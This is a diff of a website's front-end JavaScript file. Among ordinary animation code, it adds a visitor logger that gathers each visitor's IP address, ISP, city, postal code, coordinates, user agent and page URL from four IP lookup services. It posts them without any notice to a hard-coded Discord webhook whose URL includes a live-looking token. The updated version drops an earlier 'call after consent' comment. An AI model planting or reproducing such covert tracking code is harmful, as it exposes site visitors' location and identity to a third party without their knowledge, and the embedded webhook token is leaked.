@@ -42,159 +42,122 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
 
-    (async function () {
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1416239494042222734/D-Veb83YNEcOhpbiZHVKE4LmdAAnV6PMwe7_niGAoHbw-9uHfXfnDv9PIGSStCbuOi7i"; // <-- replace
+(async function () {
+      const WEBHOOK_URL = "https://discord.com/api/webhooks/1416239494042222734/D-Veb83YNEcOhpbiZHVKE4LmdAAnV6PMwe7_niGAoHbw-9uHfXfnDv9PIGSStCbuOi7i"; // replace
 
-  // Truncate utility for Discord field limits
-  function trunc(s, n = 1000) {
-    if (!s && s !== 0) return "";
-    s = String(s);
-    return s.length > n ? s.slice(0, n - 1) + "…" : s;
-  }
-
-  // Try several providers in order to collect as many fields as possible
-  async function queryIpWhoIs() {
-    try {
-      const r = await fetch("https://ipwho.is/json/", { cache: "no-store" });
-      if (!r.ok) return null;
-      return await r.json();
-    } catch { return null; }
-  }
-
-  async function queryIpApiCo() {
-    try {
-      const r = await fetch("https://ipapi.co/json/", { cache: "no-store" });
-      if (!r.ok) return null;
-      return await r.json();
-    } catch { return null; }
-  }
-
-  async function queryIfconfigCo() {
-    try {
-      const r = await fetch("https://ifconfig.co/json", { cache: "no-store" });
-      if (!r.ok) return null;
-      return await r.json();
-    } catch { return null; }
-  }
-
-  async function queryIpInfo() {
-    // Note: ipinfo.io may require a token for higher rate limits. This anonymous call may still work but can be limited.
-    try {
-      const r = await fetch("https://ipinfo.io/json", { cache: "no-store" });
-      if (!r.ok) return null;
-      return await r.json();
-    } catch { return null; }
-  }
-
-  // Merge fields from different providers into a single object
-  function mergeResults(...sources) {
-    const out = {};
-    for (const s of sources) {
-      if (!s || typeof s !== "object") continue;
-      for (const k of Object.keys(s)) {
-        if (out[k] === undefined || out[k] === null || out[k] === "") {
-          out[k] = s[k];
-        }
+      function trunc(s, n = 1000) {
+        if (!s && s !== 0) return "";
+        s = String(s);
+        return s.length > n ? s.slice(0, n - 1) + "…" : s;
       }
-    }
-    return out;
-  }
 
-  // Build embed fields from merged data (only include non-empty)
-  function buildFields(data, ua, page, ts) {
-    const fields = [];
+      async function queryIpWhoIs() {
+        try {
+          const r = await fetch("https://ipwho.is/", { cache: "no-store" });
+          if (!r.ok) return null;
+          return await r.json();
+        } catch { return null; }
+      }
 
-    function add(name, val, inline = false) {
-      if (val === undefined || val === null || val === "") return;
-      fields.push({ name, value: trunc(String(val), 1000), inline });
-    }
+      async function queryIpApiCo() {
+        try {
+          const r = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+          if (!r.ok) return null;
+          return await r.json();
+        } catch { return null; }
+      }
 
-    add("IP Address", data.ip || data.ip_address || data.ipv4 || data.ipv6);
-    add("Hostname", data.hostname || data.reverse || data.rdns || data.host);
-    add("ISP / Provider", data.isp || data.org || data.company || data.connection?.isp);
-    add("ASN", (data.asn && (data.asn.name || data.asn)) || data.org || data.connection?.asn);
-    add("Org", data.org || data.company || data.connection?.org);
-    add("City", data.city || data.region || data.region_name);
-    add("Region/State", data.region || data.region_name || data.region_code);
-    add("Country", (data.country_name || data.country || data.countryCode || data.country_code) + (data.country_code ? ` (${data.country_code})` : ""));
-    add("Continent", data.continent || data.continent_name);
-    add("Postal", data.postal || data.postal_code || data.zip);
-    // Coordinates
-    const lat = data.latitude || data.lat || (data.loc ? data.loc.split(",")[0] : null);
-    const lon = data.longitude || data.lon || (data.loc ? data.loc.split(",")[1] : null);
-    if (lat && lon) add("Coordinates", `${lat}, ${lon}`);
-    add("Timezone", data.timezone || data.time_zone || (data.utc_offset ? data.utc_offset : ""));
-    add("Currency", data.currency || data.currency_code);
-    add("Connection Type", data.connection?.type || data.connection_type || data.type);
-    add("Reverse DNS", data.reverse || data.rdns || data.reverse_dns);
-    add("Provider ASN/Prefix", data.prefix || data.asn || data.asnname);
+      async function queryIfconfigCo() {
+        try {
+          const r = await fetch("https://ifconfig.co/json", { cache: "no-store" });
+          if (!r.ok) return null;
+          return await r.json();
+        } catch { return null; }
+      }
 
-    add("Page", page, false);
-    add("User Agent", ua.slice(0, 1000), false);
-    add("Timestamp", ts, false);
+      async function queryIpInfo() {
+        try {
+          const r = await fetch("https://ipinfo.io/json", { cache: "no-store" });
+          if (!r.ok) return null;
+          return await r.json();
+        } catch { return null; }
+      }
 
-    return fields;
-  }
+      function mergeResults(...sources) {
+        const out = {};
+        for (const s of sources) {
+          if (!s || typeof s !== "object") continue;
+          for (const k of Object.keys(s)) {
+            if (out[k] === undefined || out[k] === null || out[k] === "") {
+              out[k] = s[k];
+            }
+          }
+        }
+        return out;
+      }
 
-  // Public single exported function: call after consent
-  window.sendIpToWebhook = async function () {
-    const ts = new Date().toISOString();
-    const ua = navigator.userAgent || "";
-    const page = location.href || "";
+      function buildFields(data, ua, page, ts) {
+        const fields = [];
+        function add(name, val, inline = false) {
+          if (val === undefined || val === null || val === "") return;
+          fields.push({ name, value: trunc(String(val), 1000), inline });
+        }
 
-    // Query providers in parallel for speed, then merge
-    const [a, b, c, d] = await Promise.allSettled([
-      queryIpWhoIs(), // tends to return many fields incl. isp/asn/latitude/longitude
-      queryIpApiCo(), // city/region/country/lat/lon, etc.
-      queryIfconfigCo(), // simple response
-      queryIpInfo() // ipinfo fields: ip/hostname/loc/org, etc.
-    ]);
+        add("IP Address", data.ip);
+        add("Hostname", data.hostname || data.reverse || data.rdns);
+        add("ISP / Provider", data.isp || data.org || data.company);
+        add("ASN", data.asn || data.connection?.asn);
+        add("Org", data.org || data.company);
+        add("City", data.city);
+        add("Region/State", data.region);
+        add("Country", data.country_name || data.country);
+        add("Postal", data.postal || data.zip);
 
-    const results = [];
-    if (a.status === "fulfilled" && a.value) results.push(a.value);
-    if (b.status === "fulfilled" && b.value) results.push(b.value);
-    if (c.status === "fulfilled" && c.value) results.push(c.value);
-    if (d.status === "fulfilled" && d.value) results.push(d.value);
+        const lat = data.latitude || (data.loc ? data.loc.split(",")[0] : null);
+        const lon = data.longitude || (data.loc ? data.loc.split(",")[1] : null);
+        if (lat && lon) add("Coordinates", `${lat}, ${lon}`);
 
-    if (results.length === 0) {
-      // nothing returned; still attempt to post minimal data (IP fetch failed due to CORS/network)
-      const minimalEmbed = {
-        title: "Visitor IP Log (no geo data)",
-        color: 0xff9900,
-        fields: [
-          { name: "Page", value: trunc(page), inline: false },
-          { name: "User Agent", value: trunc(ua, 1000), inline: false },
-          { name: "Timestamp", value: ts, inline: false }
-        ]
+        add("Timezone", data.timezone);
+        add("User Agent", ua, false);
+        add("Page", page, false);
+        add("Timestamp", ts, false);
+
+        return fields;
+      }
+
+      window.sendIpToWebhook = async function () {
+        const ts = new Date().toISOString();
+        const ua = navigator.userAgent || "";
+        const page = location.href || "";
+
+        const [a, b, c, d] = await Promise.allSettled([
+          queryIpWhoIs(),
+          queryIpApiCo(),
+          queryIfconfigCo(),
+          queryIpInfo()
+        ]);
+
+        const results = [];
+        if (a.status === "fulfilled" && a.value) results.push(a.value);
+        if (b.status === "fulfilled" && b.value) results.push(b.value);
+        if (c.status === "fulfilled" && c.value) results.push(c.value);
+        if (d.status === "fulfilled" && d.value) results.push(d.value);
+
+        if (results.length === 0) return;
+
+        const merged = mergeResults(...results);
+        const fields = buildFields(merged, ua, page, ts);
+
+        const embed = { title: "Visitor IP & Geo Log", color: 0x2ecc71, fields };
+
+        fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ embeds: [embed] })
+        }).catch(()=>{});
       };
-      fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [minimalEmbed] })
-      }).catch(()=>{});
-      return;
-    }
 
-    const merged = mergeResults(...results);
-
-    const fields = buildFields(merged, ua, page, ts);
-    const embed = {
-      title: "Visitor IP & Geo Log",
-      description: "",
-      color: 0x2ecc71,
-      fields
-    };
-
-    // Send embed (no console output)
-    fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ embeds: [embed] })
-    }).catch(()=>{});
-  };
-
-})();
-
+    })();
     // Intersection Observer for animations
     const observerOptions = {
         threshold: 0.1,
